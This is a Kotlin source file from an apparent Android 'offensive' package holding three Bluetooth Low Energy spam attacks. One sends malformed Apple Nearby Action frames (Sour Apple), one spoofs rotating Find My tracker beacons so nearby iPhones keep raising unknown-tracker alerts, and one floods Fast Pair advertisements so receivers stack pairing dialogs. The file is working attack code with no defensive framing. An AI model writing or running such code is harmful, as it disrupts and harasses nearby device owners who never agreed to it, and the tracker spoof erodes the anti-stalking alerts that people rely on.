package com.droid.whaly.offensive

import android.bluetooth.le.AdvertiseData
import android.util.Log
import com.droid.whaly.BluetoothAdvertiser
import com.droid.whaly.Spammer
import java.util.Random
import java.util.concurrent.Executors
import java.util.concurrent.atomic.AtomicBoolean

private const val APPLE_COMPANY_ID = 0x004C

private fun frame(type: Int, body: ByteArray): ByteArray =
    byteArrayOf(type.toByte(), body.size.toByte()) + body

private fun random(count: Int): ByteArray = ByteArray(count).also { Random().nextBytes(it) }

/**
 * Malformed Apple Nearby Action frames. The receiver parses a length that does not match the
 * payload, which is what the Sour Apple family relies on. No pairing, no user interaction.
 */
class SourAppleSpam : Spammer {
    private val running = AtomicBoolean(false)
    private val executor = Executors.newSingleThreadExecutor()
    private val random = Random()
    private var blink: Runnable? = null

    private val bodies: List<ByteArray> = listOf(
        byteArrayOf(0xC0.toByte(), 0x01) + random(3),
        byteArrayOf(0xC0.toByte(), 0x09) + random(3),
        byteArrayOf(0x40, 0x20) + random(3),
        byteArrayOf(0xBF.toByte(), 0x21) + random(3),
        byteArrayOf(0x40, 0x24) + random(3),
        byteArrayOf(0xC0.toByte(), 0x2F) + random(3),
    )

    override fun start() {
        if (!running.compareAndSet(false, true)) return
        executor.execute {
            val advertiser = BluetoothAdvertiser()
            while (running.get()) {
                val body = bodies[random.nextInt(bodies.size)] + random(random.nextInt(12))
                val data = AdvertiseData.Builder()
                    .addManufacturerData(APPLE_COMPANY_ID, frame(0x0F, body))
                    .build()
                try {
                    advertiser.advertise(data, null)
                    blink?.run()
                } catch (error: Exception) {
                    Log.w("SourApple", "advertise: ${error.message}")
                }
                try {
                    Thread.sleep(35)
                } catch (_: InterruptedException) {
                    break
                }
                try {
                    advertiser.stopAdvertising()
                } catch (_: Exception) {
                }
            }
            try {
                advertiser.stopAdvertising()
            } catch (_: Exception) {
            }
        }
    }

    override fun stop() {
        running.set(false)
    }

    override fun isSpamming(): Boolean = running.get()
    override fun setBlinkRunnable(runnable: Runnable?) { blink = runnable }
    override fun getBlinkRunnable(): Runnable? = blink
}

/**
 * Find My network frames with rotating keys. Every iPhone in range treats the phone as an
 * unknown tracker and raises an alert; keys rotate so the alert never resolves to one device.
 */
class FindMySpoofSpam : Spammer {
    private val running = AtomicBoolean(false)
    private val executor = Executors.newSingleThreadExecutor()
    private var blink: Runnable? = null

    override fun start() {
        if (!running.compareAndSet(false, true)) return
        executor.execute {
            val advertiser = BluetoothAdvertiser()
            var counter = 0
            while (running.get()) {
                val status = if (counter % 8 == 0) 0x10 else 0x00
                val data = AdvertiseData.Builder()
                    .addManufacturerData(APPLE_COMPANY_ID, frame(0x12, byteArrayOf(status.toByte()) + random(22)))
                    .build()
                try {
                    advertiser.advertise(data, null)
                    blink?.run()
                } catch (error: Exception) {
                    Log.w("FindMySpoof", "advertise: ${error.message}")
                }
                counter++
                try {
                    Thread.sleep(80)
                } catch (_: InterruptedException) {
                    break
                }
                try {
                    advertiser.stopAdvertising()
                } catch (_: Exception) {
                }
            }
            try {
                advertiser.stopAdvertising()
            } catch (_: Exception) {
            }
        }
    }

    override fun stop() { running.set(false) }
    override fun isSpamming(): Boolean = running.get()
    override fun setBlinkRunnable(runnable: Runnable?) { blink = runnable }
    override fun getBlinkRunnable(): Runnable? = blink
}

/**
 * Fast Pair at maximum rate across every known model id. Receivers stack pairing dialogs.
 */
class FastPairBombSpam : Spammer {
    private val running = AtomicBoolean(false)
    private val executor = Executors.newSingleThreadExecutor()
    private val random = Random()
    private var blink: Runnable? = null

    private val models = intArrayOf(
        // Real Fast Pair model ids. Three bytes each — the advertisement carries the
        // model id and nothing else, so a longer frame is simply ignored by Play Services.
        0xCB093B, 0x8A8F23, 0xDE215D, 0x5C7CDC, 0x9CB5F3, 0x0F2D16,
        0x5C4833, 0x9A9BDD, 0xD820EA, 0xC9E352, 0x0002F0, 0x00F7D4,
        0x13B39D, 0x1448C9, 0x1E89A7, 0x1E8B18, 0x77FF67, 0x87B25F,
    )

    override fun start() {
        if (!running.compareAndSet(false, true)) return
        executor.execute {
            val advertiser = BluetoothAdvertiser()
            val uuid = android.os.ParcelUuid.fromString("0000FE2C-0000-1000-8000-00805F9B34FB")
            while (running.get()) {
                val model = models[random.nextInt(models.size)]
                val serviceData = byteArrayOf(
                    ((model shr 16) and 0xFF).toByte(),
                    ((model shr 8) and 0xFF).toByte(),
                    (model and 0xFF).toByte(),
                )
                val data = AdvertiseData.Builder()
                    .addServiceUuid(uuid)
                    .addServiceData(uuid, serviceData)
                    .setIncludeTxPowerLevel(true)
                    .build()
                try {
                    advertiser.advertise(data, null)
                    blink?.run()
                } catch (error: Exception) {
                    Log.w("FastPairBomb", "advertise: ${error.message}")
                }
                try {
                    Thread.sleep(30)
                } catch (_: InterruptedException) {
                    break
                }
                try {
                    advertiser.stopAdvertising()
                } catch (_: Exception) {
                }
            }
            try {
                advertiser.stopAdvertising()
            } catch (_: Exception) {
            }
        }
    }

    override fun stop() { running.set(false) }
    override fun isSpamming(): Boolean = running.get()
    override fun setBlinkRunnable(runnable: Runnable?) { blink = runnable }
    override fun getBlinkRunnable(): Runnable? = blink
}
